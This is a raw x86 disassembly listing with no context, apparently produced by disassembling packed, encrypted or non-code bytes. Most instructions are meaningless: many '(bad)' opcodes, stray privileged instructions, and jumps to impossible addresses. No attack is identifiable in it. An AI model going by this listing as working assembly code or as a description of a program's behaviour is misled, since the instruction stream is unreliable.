  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
